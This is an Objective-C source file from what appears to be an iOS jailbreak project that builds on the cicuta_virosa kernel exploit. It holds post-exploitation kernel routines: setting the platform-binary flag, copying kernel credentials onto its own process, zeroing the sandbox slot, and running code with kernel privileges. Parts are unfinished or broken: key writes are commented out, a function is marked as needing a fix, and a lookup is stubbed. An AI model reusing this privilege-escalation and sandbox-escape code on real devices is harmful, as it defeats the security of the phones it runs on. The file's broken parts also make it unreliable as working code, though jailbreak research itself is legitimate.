//
//  kernel_u.m
//  reton
//
//  Created by Luca on 18.02.21.
//

#import <Foundation/Foundation.h>
#include <lib/tq/kapi.h>
#include <exploit/cicuta/cicuta_virosa.h>

#include "log.hpp"
#include "kernel_utils.h"
#include "utils.h"

#include <mach/mach_traps.h>
#include <mach/mach.h>

#include <lib/tq/iosurface.h>
#include <lib/tq/kapi.h>
#include <lib/tq/k_offsets.h>
#include <lib/tq/tq_common_p.h>
#include <lib/tq/utils.h>
#include <lib/tq/k_utils.h>

#include <util/error.hpp>

#if 1
#define MAX_CHUNK 0xff0
#else
#define MAX_CHUNK 0x2000
#endif

mach_port_t tfp0 = MACH_PORT_NULL;
uint64_t kreads = 0;
uint64_t kwrites = 0;

typedef struct __attribute__((packed)) {
    struct {
        uint64_t data;
        uint32_t reserved : 24;
        uint32_t type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

bool set_platform_binary(kptr_t proc, bool set) {
    bool ret = false;
    if(!KERN_POINTER_VALID(proc)) return 0; // what the fuck? proc needs to be invalid?
    kptr_t task_struct_addr = read_64(proc + 0x10);
    if(!KERN_POINTER_VALID(task_struct_addr)) return 0;
    kptr_t task_t_flags_addr = task_struct_addr + 0x3a0;
    uint32_t task_t_flags = read_32(task_t_flags_addr);
    if (set) {
        task_t_flags |= TF_PLATFORM;
    } else {
        task_t_flags &= ~(TF_PLATFORM);
    }
    // write_32((task_struct_addr + 0x3a0), (void*)task_t_flags);
    ret = true;
    return ret;
}

kptr_t give_creds_to_proc_at_addr(kptr_t proc, kptr_t creds) {
    // should never recieve invalid values
    MANTICORE_THROW_ON_FALSE(KERN_POINTER_VALID(proc));
    MANTICORE_THROW_ON_FALSE(KERN_POINTER_VALID(creds));
    
    auto our_creds = proc + OFFSET(proc, p_ucred);  // current creds of the proc
    auto old_creds = kapi_read_kptr(our_creds);     // store them for restoration later
    
    if (KERN_POINTER_INVALID(old_creds)) {
        manticore_warn("[give_creds_to_proc_at_addr] old_creds invalid value: %#0llx", old_creds);
        return (kptr_t)NULL;
    } else manticore_info("[give_creds_to_proc_at_addr] old_creds stored at %#0llx", old_creds);
    
    if(g_exp.debug){
        printf("---> Trying to steal creds @0x%llx's...\n", proc);
        kptr_t cred_posix = creds + OFFSET(ucred, cr_posix);
        size_t cred_posix_size = SIZE(posix_cred);
        char stolen_cred[cred_posix_size];
        struct proc_cred *cred_label;
        
        if(cred_posix_size > sizeof(cred_label->posix_cred)){
            printf("Error:\tstruct proc_cred should be bigger.");
            exit(0);
        }
        
        cred_label = (struct proc_cred *)malloc(sizeof(*cred_label));
        kapi_read(cred_posix, cred_label->posix_cred, cred_posix_size);
        cred_label->cr_label = kapi_read64(cred_posix + SIZE(posix_cred));
        cred_label->sandbox_slot = 0;
        
        if(cred_label->cr_label) {
            kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000;
            cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
            kapi_write64(cr_label + 0x10, 0x0);
        }
        
        // TODO: fix this function by trnalsating it from proc_set_root_cred
        
        kapi_write(cred_posix, stolen_cred, cred_posix_size);
        printf("---> Done\n");
    }
    
  //  kapi_write64(our_creds, creds); // update creds
    
    return old_creds;
}

bool execute_with_credentials(kptr_t proc, kptr_t creds, void (^function)(void)) {
    MANTICORE_THROW_ON_FALSE(KERN_POINTER_VALID(proc));
    MANTICORE_THROW_ON_FALSE(KERN_POINTER_VALID(creds));
    MANTICORE_THROW_ON_NULL(function);
    
    auto old_creds = give_creds_to_proc_at_addr(proc, creds);
    
    if (KERN_POINTER_INVALID(old_creds)) {
        manticore_warn("[execute_with_credentials] old_creds invalid value: %#0llx", old_creds);
        return false;
    }
    
    function();
    
    return (bool)give_creds_to_proc_at_addr(proc, old_creds);
}

kptr_t get_kernel_cred_addr(){
    MANTICORE_THROW_ON_FALSE(KERN_POINTER_VALID(g_exp.kernel_proc));
    auto k_ucred = kapi_read_kptr(g_exp.kernel_proc + OFFSET(proc, p_ucred));
    
    if (KERN_POINTER_INVALID(k_ucred)) {
        manticore_warn("[get_kernel_cred_addr] k_ucred invalid value: %#0llx", k_ucred);
        return (kptr_t)NULL;
    } else manticore_info("[get_kernel_cred_addr] kernel credits found @ 0x%llx", k_ucred);
    
    return k_ucred;
}

bool execute_with_kernel_credentials(void (^function)(void)){
    auto k_cred = get_kernel_cred_addr();
    
    uint32_t data[10] = {};
    kapi_read(g_exp.self_proc + OFFSET(proc, p_ucred), data, sizeof(data));
    util_hexprint(data, sizeof(data), "owncreds");
    
    printf("\n\n");
    
    uint32_t data2[10] = {};
    kapi_read(k_cred, data2, sizeof(data2));
    util_hexprint(data2, sizeof(data2), "kerncreds");
    
    if (KERN_POINTER_INVALID(k_cred)) {
        manticore_warn("[execute_with_kernel_credentials] k_cred invalid value: %#0llx", k_cred);
        return false;
    }
    
    if (!execute_with_credentials(g_exp.self_proc, k_cred, function)) {
        manticore_warn("[execute_with_kernel_credentials] failed to execute as kernel :(");
        return false;
    } else manticore_info("[execute_with_kernel_credentials] successfully executed as kernel :)");
    
    return true;
}



uint64_t proc_of_pid(pid_t pid) {
//    uint64_t proc = read_64(find_allproc()), pd;
//    while (proc) { //iterate over all processes till we find the one we're looking for
//        pd = read_32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
//        if (pd == pid) return proc;
//        proc = read_64(proc);
//    }
    return 0;
}

kptr_t find_vnode_with_fd(kptr_t proc, int fd) {
    kptr_t ret = KPTR_NULL;
    if(fd <= 0 || !KERN_POINTER_VALID(proc)) return 1;
    kptr_t fdp = read_64(proc + 0xf8);
    if(!KERN_POINTER_VALID(fdp)) return 2;
    kptr_t ofp = read_64(fdp + 0x0);
    if(!KERN_POINTER_VALID(ofp)) return 3;
    kptr_t fpp = read_64(ofp + (fd * sizeof(kptr_t)));
    if(!KERN_POINTER_VALID(fpp)) return 4;
    kptr_t fgp = read_64(fpp + 0x10);
    if(!KERN_POINTER_VALID(fgp)) return 5;
    kptr_t vnode = read_64(fgp + 0x38);
    if(!KERN_POINTER_VALID(vnode)) return 6;
    ret = vnode;
    return ret;
}

kptr_t find_allproc(){
    kptr_t current_proc = g_exp.kernel_proc;
    while(true){
        kptr_t next_proc = kapi_read_kptr(current_proc + OFFSET(proc, le_next));
        if(KERN_POINTER_VALID(next_proc)) current_proc = next_proc;
        if(KERN_POINTER_INVALID(next_proc)) break;
    }
    
    return current_proc;
}
